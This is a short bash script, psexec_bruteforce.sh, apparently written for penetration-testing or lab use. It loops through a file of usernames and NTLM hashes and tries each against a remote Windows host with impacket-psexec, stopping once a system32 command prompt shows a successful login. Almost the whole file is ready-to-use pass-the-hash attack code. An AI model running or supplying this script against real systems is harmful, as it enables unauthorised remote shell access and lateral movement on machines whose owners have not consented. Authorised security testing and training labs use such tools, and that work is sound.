#!/bin/bash

# ---------------------------------------------------------------------------
# Script Name: psexec_bruteforce.sh
# Description: This script uses impacket-psexec to attempt login on a remote
#              Windows machine using a list of usernames and NTLM hashes.
#              The script stops if it finds a successful login.
# Usage:       ./psexec_bruteforce.sh <input_file> <ip_address>
# Example:     ./psexec_bruteforce.sh User-and-hash.txt 192.168.245.226
# Input:       A text file with each line containing a username and a hash
#              separated by a tab.
# Output:      Prints the status of each login attempt and stops on success.
# Dependencies: Impacket's psexec, awk
# Author:      DeMzDaRulez
# Date:        9Sep23
# ---------------------------------------------------------------------------


#!/bin/bash

# Check for correct number of arguments
if [[ $# -ne 2 ]]; then
  echo "Usage: $0 <input_file> <ip_address>"
  exit 1
fi

# Get input file and IP address from command line arguments
input_file="$1"
ip_address="$2"
temp_file="temp_output.txt"

# Loop through each line in the text file
while read -r username hash; do
  
  # Execute impacket-psexec command and redirect output to a temporary file
  impacket-psexec -hashes "$hash" "$username"@"$ip_address" > "$temp_file" 2>&1
  
  # Check if the command was successful by searching for a specific string
  if grep -q "C:\\\\Windows\\\\system32>" "$temp_file"; then
    echo "Successful login with $username and hash $hash."
    rm -f "$temp_file"
    break
  else
    echo "Failed login with $username and hash $hash."
  fi
  
done < <(awk -F'\t' '{print $1, $2}' "$input_file")

# Remove the temporary file if it still exists
[ -f "$temp_file" ] && rm -f "$temp_file"
